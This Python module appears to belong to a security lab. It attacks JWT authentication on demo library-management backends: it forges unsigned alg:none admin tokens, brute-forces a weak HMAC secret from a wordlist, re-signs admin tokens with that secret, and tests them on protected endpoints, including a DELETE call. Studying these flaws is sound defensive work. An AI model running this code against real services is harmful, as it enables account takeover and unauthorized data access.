"""
JWT Token Hijacking Attacks - Demonstrates real-world JWT vulnerabilities
against Library Management System backend

This module implements:
1. Algorithm-None Attack (alg: none)
2. Weak HMAC Brute-Force Attack
3. Token Analysis and Forensics
"""

import requests
import json
import base64
import hashlib
import hmac
import time
from typing import Dict, Any, Optional, Tuple
from pathlib import Path
import logging

from core.jwt_config import (
    BACKENDS, TEST_CREDENTIALS, API_ENDPOINTS, 
    ATTACK_CONFIG, DATA_PATHS, get_backend_url
)
from core.logging_setup import get_logger, log_attack
from core.utils import (
    decode_jwt_without_verification, get_token_hash, 
    craft_alg_none_token, sign_token_with_secret,
    verify_token_with_secret, save_json_data
)

logger = logging.getLogger(__name__)

class JWTAttacker:
    """Main JWT attack framework"""
    
    def __init__(self, backend_name: str = "vulnerable"):
        """Initialize attacker with target backend"""
        self.backend = BACKENDS[backend_name]
        self.backend_name = backend_name
        self.weak_secret = getattr(self, f'_get_weak_secret_{backend_name}', lambda: None)()
        self.results = {
            "timestamp": time.time(),
            "backend": backend_name,
            "attacks": []
        }
    
    def _get_weak_secret_vulnerable(self) -> str:
        """Get weak secret for vulnerable backend"""
        return "library-secret-123"
    
    def _get_weak_secret_secure(self) -> Optional[str]:
        """Secure backend doesn't use weak secret"""
        return None
    
    def get_valid_token(self, username: str = "admin", password: str = "admin123") -> Optional[str]:
        """
        Get valid JWT token from backend
        
        Args:
            username: Username for login
            password: Password for login
            
        Returns:
            JWT token string or None
        """
        try:
            endpoint = self.backend["url"] + API_ENDPOINTS[self.backend_name]["login_jwt"]
            response = requests.post(
                endpoint,
                json={"username": username, "password": password},
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get("success"):
                    token = data.get("token")
                    logger.info(f"[{self.backend_name}] Valid token obtained for {username}")
                    log_attack("GET_TOKEN", "Login endpoint", "SUCCESS", f"User: {username}")
                    return token
        except Exception as e:
            logger.error(f"[{self.backend_name}] Error getting valid token: {e}")
            log_attack("GET_TOKEN", "Login endpoint", "FAILED", f"Error: {str(e)}")
        
        return None
    
    def analyze_token(self, token: str) -> Optional[Dict[str, Any]]:
        """
        Analyze JWT token structure
        
        Args:
            token: JWT token to analyze
            
        Returns:
            Dictionary with header, payload, and analysis
        """
        decoded = decode_jwt_without_verification(token)
        if decoded:
            analysis = {
                "header": decoded["header"],
                "payload": decoded["payload"],
                "signature": decoded["signature"][:20] + "..." if decoded["signature"] else None,
                "algorithm": decoded["header"].get("alg"),
                "token_type": decoded["header"].get("typ"),
                "claims": list(decoded["payload"].keys()),
                "role": decoded["payload"].get("role"),
                "username": decoded["payload"].get("username"),
                "userId": decoded["payload"].get("userId"),
            }
            return analysis
        return None
    
    def craft_alg_none_attack(self, original_token: str, 
                             new_role: str = "Admin", 
                             new_username: str = "admin") -> Tuple[str, Dict[str, Any]]:
        """
        Craft forged JWT with alg: none (no signature required)
        
        This demonstrates the algorithm downgrade vulnerability where:
        - Backend accepts 'alg: none' (no signature verification)
        - Attacker can craft any token with any claims
        - No cryptographic verification needed
        
        Args:
            original_token: Valid token to base structure on
            new_role: Role to claim in forged token
            new_username: Username to claim in forged token
            
        Returns:
            Tuple of (forged_token, attack_info)
        """
        try:
            # Decode original to understand structure
            decoded = decode_jwt_without_verification(original_token)
            
            # Craft new payload
            forged_payload = {
                "userId": decoded["payload"].get("userId"),
                "username": new_username,
                "role": new_role,
                "iat": int(time.time()),
                "exp": int(time.time()) + 3600,
                "forged": True,
                "attack": "alg_none"
            }
            
            # Create token with alg: none
            forged_token = craft_alg_none_token(original_token, new_role, new_username)
            
            attack_info = {
                "attack_type": "algorithm_none",
                "original_role": decoded["payload"].get("role"),
                "forged_role": new_role,
                "original_username": decoded["payload"].get("username"),
                "forged_username": new_username,
                "signature_required": False,
                "algorithm_used": "none"
            }
            
            logger.info(f"[{self.backend_name}] Forged token with alg:none | Role: {new_role}")
            log_attack("FORGE_TOKEN", f"alg:none | {new_username}:{new_role}", "SUCCESS", 
                      f"Original: admin:{decoded['payload'].get('role')}")
            
            return forged_token, attack_info
        except Exception as e:
            logger.error(f"[{self.backend_name}] Error crafting alg:none token: {e}")
            log_attack("FORGE_TOKEN", "alg:none", "FAILED", str(e))
            return None, {}
    
    def brute_force_secret(self, token: str, wordlist_path: str = None) -> Tuple[Optional[str], float]:
        """
        Attempt to brute-force HMAC-SHA256 secret using wordlist
        
        This demonstrates the weak secret vulnerability where:
        - Secret is weak (low entropy)
        - Can be brute-forced with common password lists
        - Once recovered, attacker can forge any token
        
        Args:
            token: Valid JWT token to test against
            wordlist_path: Path to wordlist file
            
        Returns:
            Tuple of (recovered_secret, recovery_time_seconds)
        """
        if not wordlist_path:
            wordlist_path = ATTACK_CONFIG["wordlist_path"]
        
        try:
            decoded = decode_jwt_without_verification(token)
            payload_b64 = token.split('.')[1]
            signature_b64 = token.split('.')[2]
            
            # Read wordlist
            wordlist_file = Path(wordlist_path)
            if not wordlist_file.exists():
                logger.error(f"Wordlist not found: {wordlist_path}")
                return None, 0
            
            start_time = time.time()
            attempts = 0
            
            with open(wordlist_file, 'r') as f:
                for attempt, line in enumerate(f, 1):
                    secret = line.strip()
                    attempts = attempt
                    
                    # Try to sign token with this secret and verify signature matches
                    try:
                        # Recreate the signature with this secret
                        message = token.rsplit('.', 1)[0]
                        expected_signature = base64.urlsafe_b64encode(
                            hmac.new(
                                secret.encode(),
                                message.encode(),
                                hashlib.sha256
                            ).digest()
                        ).rstrip(b'=').decode()
                        
                        if expected_signature == signature_b64:
                            recovery_time = time.time() - start_time
                            logger.info(f"[{self.backend_name}] Secret recovered! '{secret}' in {recovery_time:.2f}s after {attempts} attempts")
                            log_attack("BRUTE_FORCE_SECRET", f"{attempts} attempts", "SUCCESS",
                                     f"Secret: {secret} | Time: {recovery_time:.2f}s")
                            
                            self.results["attacks"].append({
                                "type": "brute_force_secret",
                                "success": True,
                                "secret": secret,
                                "attempts": attempts,
                                "time_seconds": recovery_time
                            })
                            
                            return secret, recovery_time
                    except Exception:
                        pass
                    
                    if attempts >= ATTACK_CONFIG["max_brute_force_attempts"]:
                        break
            
            recovery_time = time.time() - start_time
            logger.warning(f"[{self.backend_name}] Secret not found in wordlist after {attempts} attempts ({recovery_time:.2f}s)")
            log_attack("BRUTE_FORCE_SECRET", f"{attempts} attempts", "FAILED", "Secret not in wordlist")
            
            return None, recovery_time
        except Exception as e:
            logger.error(f"[{self.backend_name}] Brute-force error: {e}")
            log_attack("BRUTE_FORCE_SECRET", "wordlist search", "ERROR", str(e))
            return None, 0
    
    def craft_forged_token_with_secret(self, original_token: str, 
                                      secret: str, 
                                      new_role: str = "Admin") -> Optional[str]:
        """
        Craft forged token using recovered secret
        
        Once the HMAC secret is brute-forced, attacker can:
        - Forge tokens as any user
        - Assign any role
        - Bypass all authentication
        
        Args:
            original_token: Original token to base structure on
            secret: Recovered HMAC secret
            new_role: Role to assign in forged token
            
        Returns:
            Forged token or None
        """
        try:
            decoded = decode_jwt_without_verification(original_token)
            
            forged_payload = {
                "userId": decoded["payload"].get("userId"),
                "username": "admin",
                "role": new_role,
                "iat": int(time.time()),
                "exp": int(time.time()) + 3600,
                "forged": True
            }
            
            forged_token = sign_token_with_secret(forged_payload, secret, "HS256")
            logger.info(f"[{self.backend_name}] Forged token created with recovered secret | Role: {new_role}")
            log_attack("FORGE_WITH_SECRET", f"admin:{new_role}", "SUCCESS",
                      f"Token length: {len(forged_token)}")
            
            return forged_token
        except Exception as e:
            logger.error(f"[{self.backend_name}] Error forging token with secret: {e}")
            log_attack("FORGE_WITH_SECRET", "admin", "ERROR", str(e))
            return None
    
    def test_forged_token(self, forged_token: str, endpoint_key: str = "books_protected",
                         method: str = "GET") -> Tuple[bool, int, str]:
        """
        Test if forged token grants unauthorized access
        
        Args:
            forged_token: Forged JWT token
            endpoint_key: API endpoint to test ("books_protected", "members_protected", etc.)
            method: HTTP method (GET, DELETE, POST, etc.)
            
        Returns:
            Tuple of (success, status_code, response_text)
        """
        try:
            url = self.backend["url"] + API_ENDPOINTS[self.backend_name].get(endpoint_key, "")
            headers = {"Authorization": f"Bearer {forged_token}"}
            
            if method == "GET":
                response = requests.get(url, headers=headers, timeout=5)
            elif method == "DELETE":
                # Test delete with a dummy ID
                url = f"{url}/B999"  # Non-existent book ID
                response = requests.delete(url, headers=headers, timeout=5)
            else:
                response = requests.request(method, url, headers=headers, timeout=5)
            
            success = response.status_code < 400
            logger.info(f"[{self.backend_name}] Forged token test | Endpoint: {endpoint_key} | Status: {response.status_code} | Success: {success}")
            log_attack("TEST_FORGED_TOKEN", endpoint_key, "SUCCESS" if success else "FAILED",
                      f"HTTP {response.status_code}")
            
            return success, response.status_code, response.text[:200]
        except Exception as e:
            logger.error(f"[{self.backend_name}] Error testing forged token: {e}")
            log_attack("TEST_FORGED_TOKEN", endpoint_key, "ERROR", str(e))
            return False, 500, str(e)
    
    def measure_attack_success_rate(self, num_attempts: int = 10) -> Dict[str, Any]:
        """
        Measure overall attack success rate
        
        Args:
            num_attempts: Number of times to repeat attack
            
        Returns:
            Dictionary with success statistics
        """
        results = {
            "total_attempts": num_attempts,
            "alg_none_success": 0,
            "brute_force_success": 0,
            "unauthorized_access": 0,
            "attacks": []
        }
        
        for i in range(num_attempts):
            logger.info(f"[{self.backend_name}] Attack attempt {i+1}/{num_attempts}")
            
            # Step 1: Get valid token
            valid_token = self.get_valid_token()
            if not valid_token:
                continue
            
            # Step 2: Try alg:none attack
            forged_token, info = self.craft_alg_none_attack(valid_token, "Admin", "admin")
            if forged_token:
                success, code, _ = self.test_forged_token(forged_token)
                if success:
                    results["alg_none_success"] += 1
                    results["unauthorized_access"] += 1
            
            # Step 3: Try brute-force attack
            if self.weak_secret:
                secret, recovery_time = self.brute_force_secret(valid_token)
                if secret:
                    results["brute_force_success"] += 1
                    forged_token_2 = self.craft_forged_token_with_secret(valid_token, secret)
                    if forged_token_2:
                        success, code, _ = self.test_forged_token(forged_token_2)
                        if success:
                            results["unauthorized_access"] += 1
        
        results["alg_none_success_rate"] = results["alg_none_success"] / num_attempts
        results["brute_force_success_rate"] = results["brute_force_success"] / num_attempts
        results["unauthorized_access_rate"] = results["unauthorized_access"] / (num_attempts * 2)  # 2 attacks per attempt
        
        logger.info(f"[{self.backend_name}] Attack success rates: alg:none={results['alg_none_success_rate']:.1%}, "
                   f"brute-force={results['brute_force_success_rate']:.1%}, access={results['unauthorized_access_rate']:.1%}")
        
        return results
    
    def save_results(self, output_path: str = None):
        """Save attack results to JSON"""
        if not output_path:
            output_path = DATA_PATHS["attack_results"]
        
        save_json_data(self.results, output_path)
        logger.info(f"Attack results saved to {output_path}")


# Convenience functions for standalone use

def attack_vulnerable_backend():
    """Execute full attack against vulnerable backend"""
    attacker = JWTAttacker("vulnerable")
    
    # Get valid token
    token = attacker.get_valid_token()
    if not token:
        logger.error("Could not obtain valid token")
        return
    
    # Analyze token
    analysis = attacker.analyze_token(token)
    print("\n=== Original Token Analysis ===")
    print(json.dumps(analysis, indent=2))
    
    # Attack 1: alg:none
    print("\n=== Attack 1: Algorithm-None ===")
    forged_token, info = attacker.craft_alg_none_attack(token)
    if forged_token:
        success, code, _ = attacker.test_forged_token(forged_token)
        print(f"alg:none attack successful: {success} (HTTP {code})")
    
    # Attack 2: Brute-force
    print("\n=== Attack 2: Brute-Force Secret ===")
    secret, recovery_time = attacker.brute_force_secret(token)
    if secret:
        print(f"Secret recovered: '{secret}' in {recovery_time:.2f} seconds")
        forged_token_2 = attacker.craft_forged_token_with_secret(token, secret)
        if forged_token_2:
            success, code, _ = attacker.test_forged_token(forged_token_2)
            print(f"Access granted with forged token: {success} (HTTP {code})")
    
    # Measure success rate
    print("\n=== Attack Success Rate ===")
    results = attacker.measure_attack_success_rate(5)
    print(json.dumps(results, indent=2))
    
    # Save results
    attacker.save_results()
    print(f"\nResults saved to {DATA_PATHS['attack_results']}")


if __name__ == "__main__":
    # Initialize logging
    from core.logging_setup import initialize_all_loggers
    initialize_all_loggers()
    
    # Run attacks
    attack_vulnerable_backend()
